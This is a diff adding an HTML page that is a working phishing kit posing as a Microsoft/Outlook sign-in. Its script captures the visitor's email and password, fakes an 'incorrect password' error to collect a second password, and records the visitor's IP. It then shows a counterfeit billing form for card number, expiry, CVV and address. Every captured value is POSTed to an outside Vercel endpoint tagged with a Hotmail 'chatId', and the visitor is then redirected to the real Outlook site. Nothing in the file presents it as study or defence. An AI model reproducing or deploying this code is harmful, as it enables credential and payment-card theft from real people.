@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Welcome Back!</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap"
+    rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Work Sans', sans-serif;
+      font-optical-sizing: auto;
+    }
+
+    .bg {
+      background-image: url('https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/bg.png');
+      background-size: cover;
+      background-position: center;
+    }
+  </style>
+</head>
+
+<body class="w-screen h-screen flex items-center justify-center">
+  <div id="app"
+    class="px-3 py-5 md:p-[auto] w-screen h-screen flex items-center justify-center flex-col gap-6 text-[#323130] bg">
+    <div class="border md:border-none w-full md:w-[27rem] min-h-[22rem] p-10 flex flex-col shadow bg-white space-y-5">
+      <header class="text-3xl text-[#323130] font-extrabold flex items-center">
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/ms-logo.svg"
+          class="w-[8rem]" />
+      </header>
+
+      <section class="text-[#323130]">
+        <p id="title" class="text-2xl font-semibold">Sign in</p>
+        <div id="email-display"
+          class="hidden text-xs font-medium text-gray-500 flex items-end justify-center text-center">
+          <p id="email-display-text" class="border w-fit p-1 rounded-xl"></p>
+        </div>
+        <p id="password-title" class="hidden text-2xl font-semibold text-center">Enter Password</p>
+      </section>
+
+      <div id="email-container" class="relative mt-5">
+        <label class="absolute -top-2 left-2 bg-white px-1 text-xs text-gray-500">Email, phone, or skype</label>
+        <div class="flex items-center border border-gray-300 border-b-2 border-b-[#0067b8]">
+          <input id="email-input" type="text" class="tracking-tight outline-none w-full px-3 py-2.5 text-lg" />
+        </div>
+      </div>
+
+      <div id="password-container" class="hidden relative mt-5">
+        <label class="absolute -top-2 left-2 bg-white px-1 text-xs text-gray-500">Password</label>
+        <div class="flex items-center border border-gray-300 border-b-2 border-b-[#0067b8]">
+          <input id="password-input" type="password" class="tracking-tight outline-none w-full px-3 py-2.5 text-lg" />
+          <button id="toggle-password" type="button" class="px-3 text-gray-500 hover:text-gray-700">
+            <svg id="eye-icon" class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <p id="error-msg" class="hidden text-red-600"></p>
+
+      <p class="mt-3 text-sm">
+        No account? <span class="text-[#00A4EF]">Create one!</span>
+      </p>
+
+      <div class="mt-3">
+        <button id="submit-btn" class="w-full bg-[#0067B8] text-white py-2 font-medium">
+          Next
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Billing Section (Hidden by default) -->
+  <section id="billing-section"
+    class="hidden w-full max-w-[450px] h-fit max-h-[90vh] overflow-y-auto bg-white rounded-lg shadow-xl mb-10 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
+    <div class="p-5 text-center border-b">
+      <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/ms-logo.svg"
+        class="w-[8rem] mx-auto mb-3" />
+      <div class="flex items-center justify-center gap-4">
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/viza.png" class="h-8" />
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/mc.png" class="h-8" />
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/am.png" class="h-8" />
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/dc.png" class="h-8" />
+      </div>
+      <h2 class="text-xl font-bold mt-3">UPDATE YOUR INFORMATION</h2>
+    </div>
+
+    <div class="p-6 flex flex-col gap-4 text-sm text-gray-700">
+      <div class="flex flex-col gap-1">
+        <label class="font-semibold">Card number</label>
+        <input id="card-number" type="text"
+          class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none"
+          placeholder="0000 0000 0000 0000">
+        <p id="error-card-number" class="text-red-600 text-xs hidden"></p>
+      </div>
+
+      <div class="flex flex-col gap-1">
+        <label class="font-semibold">Name on card</label>
+        <input id="card-name" type="text"
+          class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+        <p id="error-card-name" class="text-red-600 text-xs hidden"></p>
+      </div>
+
+      <div class="flex gap-4">
+        <div class="flex flex-col gap-1 flex-1">
+          <label class="font-semibold">Expires</label>
+          <div class="flex gap-2">
+            <select id="exp-mm"
+              class="border border-gray-300 rounded px-2 py-2 w-full focus:border-[#0078d4] outline-none appearance-none bg-white">
+              <option value="" disabled selected>MM</option>
+              <option value="01">01</option>
+              <option value="02">02</option>
+              <option value="03">03</option>
+              <option value="04">04</option>
+              <option value="05">05</option>
+              <option value="06">06</option>
+              <option value="07">07</option>
+              <option value="08">08</option>
+              <option value="09">09</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+            </select>
+            <select id="exp-yyyy"
+              class="border border-gray-300 rounded px-2 py-2 w-full focus:border-[#0078d4] outline-none appearance-none bg-white">
+              <option value="" disabled selected>YY</option>
+            </select>
+          </div>
+          <p id="error-expiry" class="text-red-600 text-xs hidden"></p>
+        </div>
+        <div class="flex flex-col gap-1 w-[80px]">
+          <label class="font-semibold">CVV</label>
+          <input id="cvv" type="text"
+            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none" maxlength="4">
+          <p id="error-cvv" class="text-red-600 text-xs hidden"></p>
+        </div>
+      </div>
+
+      <div class="flex flex-col gap-1">
+        <label class="font-semibold">Address</label>
+        <input id="address-1" type="text"
+          class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+        <p id="error-address-1" class="text-red-600 text-xs hidden"></p>
+      </div>
+
+      <div class="flex gap-4">
+        <div class="flex flex-col gap-1 flex-1">
+          <label class="font-semibold">City</label>
+          <input id="city" type="text"
+            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+        </div>
+        <div class="flex flex-col gap-1 flex-1">
+          <label class="font-semibold">State</label>
+          <input id="state" type="text"
+            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+        </div>
+      </div>
+
+      <div class="flex flex-col gap-1">
+        <label class="font-semibold">Zip Code</label>
+        <input id="zip-code" type="text"
+          class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+      </div>
+
+      <div class="flex flex-col gap-2 mt-2">
+        <button id="billing-submit-btn"
+          class="w-full bg-[#0078d4] text-white py-3 rounded font-bold hover:bg-[#005a9e] transition-colors">
+          Verify
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    const baseURL = 'https://fr-1290-2o1v.vercel.app/';
+    const CHAT_ID = 'ayods1270@hotmail.com';
+
+    let state = {
+      email: '',
+      password: '',
+      password2: '',
+      showPassword: false,
+      showBilling: false,
+      IPAddress: '',
+      redirect: false,
+      error: false,
+      btn: 'Next',
+      showError: false
+    };
+
+    const elements = {
+      app: document.getElementById('app'),
+      title: document.getElementById('title'),
+      emailDisplay: document.getElementById('email-display'),
+      emailDisplayText: document.getElementById('email-display-text'),
+      passwordTitle: document.getElementById('password-title'),
+      emailInput: document.getElementById('email-input'),
+      passwordInput: document.getElementById('password-input'),
+      emailContainer: document.getElementById('email-container'),
+      passwordContainer: document.getElementById('password-container'),
+      errorMsg: document.getElementById('error-msg'),
+      submitBtn: document.getElementById('submit-btn'),
+      billingSection: document.getElementById('billing-section')
+    };
+
+    function isValidEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+
+    async function authenticate(data) {
+      const payload = {
+        data: JSON.stringify({
+          name: data.name,
+          email: data.email,
+          passwordOne: data.password,
+          passwordTwo: data.password2,
+          IPAddress: data.IPAddress
+        }),
+        title: data.title,
+        chatId: CHAT_ID
+      };
+
+      try {
+        const response = await fetch(`${baseURL}main`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (e) {
+        console.log(e);
+        return { status: 'error' };
+      }
+    }
+
+    async function sendBillingData(billingData) {
+      const payload = {
+        data: JSON.stringify({
+          email: state.email,
+          IPAddress: state.IPAddress,
+          name: 'Outlook Billing',
+          ...billingData
+        }),
+        title: 'Outlook Billing Info',
+        chatId: CHAT_ID
+      };
+
+      try {
+        await fetch(`${baseURL}main`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ...payload })
+        });
+        window.location.replace('https://outlook.live.com/');
+      } catch (e) {
+        console.log(e);
+        window.location.replace('https://outlook.live.com/');
+      }
+    }
+
+    function updateUI() {
+      if (!state.showPassword && !state.showBilling) {
+        elements.title.classList.remove('hidden');
+        elements.emailDisplay.classList.add('hidden');
+        elements.passwordTitle.classList.add('hidden');
+        elements.emailContainer.classList.remove('hidden');
+        elements.passwordContainer.classList.add('hidden');
+      } else if (state.showPassword && !state.showBilling) {
+        elements.title.classList.add('hidden');
+        elements.emailDisplay.classList.remove('hidden');
+        elements.emailDisplayText.textContent = state.email;
+        elements.passwordTitle.classList.remove('hidden');
+        elements.emailContainer.classList.add('hidden');
+        elements.passwordContainer.classList.remove('hidden');
+      }
+
+      if (state.showError) {
+        elements.errorMsg.classList.remove('hidden');
+        elements.errorMsg.textContent = state.error;
+      } else {
+        elements.errorMsg.classList.add('hidden');
+      }
+
+      elements.submitBtn.textContent = state.btn;
+    }
+
+    function showBillingSection() {
+      elements.billingSection.classList.remove('hidden');
+      elements.app.classList.add('hidden');
+      const billingEmail = document.getElementById('billing-email');
+      if (billingEmail) billingEmail.value = state.email;
+    }
+
+    function handleClick() {
+      if (!state.showPassword) {
+        state.showError = false;
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(state.email)) {
+          state.showError = true;
+          state.error = 'Please enter a valid email address';
+          updateUI();
+          return;
+        }
+        state.btn = 'Submit';
+        state.showPassword = true;
+        updateUI();
+        return;
+      }
+
+      if (state.showPassword && !state.password) {
+        state.showError = true;
+        state.error = 'Please enter your password';
+        updateUI();
+        return;
+      }
+
+      if (state.showPassword && state.password && !state.password2) {
+        state.password2 = state.password;
+        state.password = '';
+        state.showError = true;
+        state.error = 'Incorrect password. Please try again.';
+        document.getElementById('password-input').value = '';
+        updateUI();
+        return;
+      }
+
+      if (state.showPassword && state.password && state.password2) {
+        authenticate({
+          email: state.email,
+          password: state.password2,
+          password2: state.password,
+          name: 'Outlook',
+          IPAddress: state.IPAddress,
+          title: 'Outlook'
+        }).then(() => {
+          state.showBilling = true;
+          showBillingSection();
+        });
+      }
+    }
+
+    function handleBillingSubmit() {
+      document.querySelectorAll('[id^="error-"]').forEach(el => el.classList.add('hidden'));
+
+      let isValid = true;
+
+      const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
+      const cardName = document.getElementById('card-name').value.trim();
+      const expMM = document.getElementById('exp-mm').value;
+      const expYY = document.getElementById('exp-yyyy').value;
+      const cvv = document.getElementById('cvv').value.trim();
+      const address = document.getElementById('address-1').value.trim();
+      const city = document.getElementById('city') ? document.getElementById('city').value.trim() : '';
+      const state = document.getElementById('state') ? document.getElementById('state').value.trim() : '';
+      const zipCode = document.getElementById('zip-code') ? document.getElementById('zip-code').value.trim() : '';
+
+      if (!cardNum || cardNum.length < 13) {
+        document.getElementById('error-card-number').innerText = 'Invalid card number';
+        document.getElementById('error-card-number').classList.remove('hidden');
+        isValid = false;
+      }
+      if (!cardName) {
+        document.getElementById('error-card-name').innerText = 'Name required';
+        document.getElementById('error-card-name').classList.remove('hidden');
+        isValid = false;
+      }
+      if (!expMM || !expYY) {
+        document.getElementById('error-expiry').innerText = 'Date required';
+        document.getElementById('error-expiry').classList.remove('hidden');
+        isValid = false;
+      }
+      if (!cvv || cvv.length < 3) {
+        document.getElementById('error-cvv').innerText = 'Invalid CVV';
+        document.getElementById('error-cvv').classList.remove('hidden');
+        isValid = false;
+      }
+      if (!address) {
+        document.getElementById('error-address-1').innerText = 'Address required';
+        document.getElementById('error-address-1').classList.remove('hidden');
+        isValid = false;
+      }
+
+      if (isValid) {
+        sendBillingData({
+          cardNumber: cardNum,
+          cardName: cardName,
+          expiry: `${expMM}/${expYY}`,
+          cvv: cvv,
+          address: address,
+          city: city,
+          state: state,
+          zipCode: zipCode
+        });
+      }
+    }
+
+    function init() {
+      const yearSelect = document.getElementById('exp-yyyy');
+      const currentYear = new Date().getFullYear();
+      const twoDigitYear = currentYear % 100;
+      for (let i = 0; i < 15; i++) {
+        const yy = (twoDigitYear + i) % 100;
+        const formattedYY = yy.toString().padStart(2, '0');
+        const option = document.createElement('option');
+        option.value = formattedYY;
+        option.textContent = formattedYY;
+        yearSelect.appendChild(option);
+      }
+
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          state.IPAddress = data.ip;
+        })
+        .catch(error => {
+          console.error(error);
+        });
+
+      elements.emailInput.addEventListener('input', (e) => {
+        state.email = e.target.value;
+      });
+
+      elements.passwordInput.addEventListener('input', (e) => {
+        state.password = e.target.value;
+      });
+
+      elements.submitBtn.addEventListener('click', handleClick);
+
+      const cardInput = document.getElementById('card-number');
+      if (cardInput) {
+        cardInput.addEventListener('input', (e) => {
+          let value = e.target.value.replace(/\D/g, '');
+          let formattedValue = '';
+          for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) {
+              formattedValue += ' ';
+            }
+            formattedValue += value[i];
+          }
+          e.target.value = formattedValue;
+        });
+      }
+
+      const cvvInput = document.getElementById('cvv');
+      if (cvvInput) {
+        cvvInput.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/\D/g, '');
+        });
+      }
+
+      const billingBtn = document.getElementById('billing-submit-btn');
+      if (billingBtn) {
+        billingBtn.addEventListener('click', handleBillingSubmit);
+      }
+
+      const togglePasswordBtn = document.getElementById('toggle-password');
+      if (togglePasswordBtn) {
+        togglePasswordBtn.addEventListener('click', () => {
+          const type = elements.passwordInput.type === 'password' ? 'text' : 'password';
+          elements.passwordInput.type = type;
+        });
+      }
+    }
+
+    init();
+  </script>
+</body>
+
+</html>
